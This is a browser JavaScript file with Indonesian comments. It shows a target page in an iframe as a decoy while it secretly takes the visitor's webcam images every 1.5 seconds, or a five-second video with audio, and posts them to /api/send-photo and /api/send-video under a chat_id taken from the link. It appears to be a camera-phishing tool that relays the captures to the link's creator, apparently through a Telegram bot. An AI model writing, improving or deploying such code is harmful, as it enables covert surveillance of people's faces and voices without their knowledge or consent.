import { transcodeWebMtoMP4 } from './pages/api/send-mp4.js'; // Paling atas

const params = new URLSearchParams(window.location.search);
const url = params.get('url');
const uid = params.get('uid');


if (!url || !uid) {
  document.body.innerHTML = '<h2 style="text-align:center;margin-top:20%;">❌ Parameter tidak lengkap</h2>';
  throw new Error("Missing URL or UID");
}

// Set target iframe
document.getElementById("targetFrame").src = decodeURIComponent(url);

const isPhotoMode = window.location.pathname.includes("article") && !window.location.pathname.includes("news");
const video = document.getElementById("video");

// === Mode FOTO ===
if (isPhotoMode && document.getElementById("canvas")) {
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");

  async function initPhotoCapture() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      video.srcObject = stream;

      setInterval(() => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const base64 = canvas.toDataURL("image/png");

        const bin = atob(base64.split(',')[1]);
        const buffer = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) buffer[i] = bin.charCodeAt(i);
        const blob = new Blob([buffer], { type: "image/png" });

        const form = new FormData();
        form.append("chat_id", uid);
        form.append("photo", blob, "webcam.png");

        const timestamp = new Date().toLocaleTimeString();
        form.append("caption", `Berhasil mengambil gambar\n${timestamp}`);

        fetch(`/api/send-photo`, {
            method: "POST",
            body: form
        });

      }, 1500);
    } catch (e) {
      console.error("❌ Gagal akses webcam (foto):", e);
    }
  }

  initPhotoCapture();
}

// === Mode VIDEO ===
if (!isPhotoMode) {
  let stream;
  let recorder;
  let chunks = [];

  async function initVideoRecording() {
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      video.srcObject = stream;

      recorder = new MediaRecorder(stream);
      recorder.ondataavailable = e => chunks.push(e.data);
      recorder.onstop = async () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        const mp4Blob = await transcodeWebMtoMP4(blob); // Transcode ke mp4

        const form = new FormData();
        form.append("chat_id", uid);
        form.append("video", mp4Blob, "webcam.mp4");


        const timestamp = new Date().toLocaleTimeString();
        form.append("caption", `Berhasil merekam\n${timestamp}`);
        
        fetch(`/api/send-video`, {
            method: "POST",
            body: form
        });


      };


      recorder.start();

      setTimeout(() => {
        recorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, 5000); // 5 detik
    } catch (err) {
      console.error("❌ Gagal akses webcam (video):", err);
    }
  }

  window.onload = () => {
    initVideoRecording();
  };
}
